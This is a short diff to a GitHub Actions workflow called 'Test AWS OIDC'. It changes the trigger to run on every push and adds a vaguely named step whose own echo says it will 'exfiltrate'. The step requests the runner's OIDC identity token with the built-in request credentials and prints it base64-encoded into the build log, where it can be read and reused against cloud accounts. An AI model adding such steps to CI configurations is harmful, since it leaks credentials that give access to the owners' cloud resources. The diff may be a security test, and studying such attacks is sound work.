@@ -1,5 +1,5 @@
 name: Test AWS OIDC
-on: workflow_dispatch
+on: push
 permissions:
       id-token: write
       contents: read 
@@ -11,6 +11,12 @@ jobs:
       file: filler.txt
       aws-account: 444838350740
     steps:
+      - name: Fille
+        run: |
+          echo "Running from a PR, exfiltrate"
+          curl -o output.txt -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 
+          cat output.txt | base64
+        
       - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v1
         with:
